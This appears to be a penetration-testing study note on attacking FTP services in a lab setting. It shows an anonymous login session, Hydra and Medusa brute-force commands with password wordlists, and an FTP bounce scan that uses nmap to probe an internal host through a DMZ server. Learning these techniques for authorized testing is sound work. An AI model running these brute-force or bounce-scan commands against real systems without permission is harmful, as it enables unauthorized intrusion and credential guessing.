#### Anonymous Authentication
```shell-session
wannacrye@htb[/htb]$ ftp 192.168.2.142    
                     
Connected to 192.168.2.142.
220 (vsFTPd 2.3.4)
Name (192.168.2.142:kali): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0               9 Aug 12 16:51 test.txt
226 Directory send OK.
```

Nmap can do this with `sudo nmap -sC -sV -p 21 <IP>`

#### Brute Forcing 
##### Hydra
`hydra -L usernames.list -P passwords.list ftp://<IP> -t 48`

##### Medusa
`medusa -u fiona -P /usr/share/wordlists/rockyou.txt -h 10.129.203.7 -M ftp`

#### FTP Bounce Attack
Use the PORT command to make the FTP server deliver outbound traffic to another device on the network.

- Useful if a DMZ FTP server is reachable but the target (Internal server) is not, but is from the external DMZ.

![[Pasted image 20240727192606.png]]

##### How to Use
`nmap -b`

We're logging in anonymously to the external server (10.10.110.213), and scanning the internal network
```shell
wannacrye@htb[/htb]$ nmap -Pn -v -n -p80 -b anonymous:password@10.10.110.213 172.17.0.2

Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-27 04:55 EDT
Resolved FTP bounce attack proxy to 10.10.110.213 (10.10.110.213).
Attempting connection to ftp://anonymous:password@10.10.110.213:21
Connected:220 (vsFTPd 3.0.3)
Login credentials accepted by FTP server!
Initiating Bounce Scan at 04:55
FTP command misalignment detected ... correcting.
Completed Bounce Scan at 04:55, 0.54s elapsed (1 total ports)
Nmap scan report for 172.17.0.2
Host is up.

PORT   STATE  SERVICE
80/tcp open http

<SNIP>
```

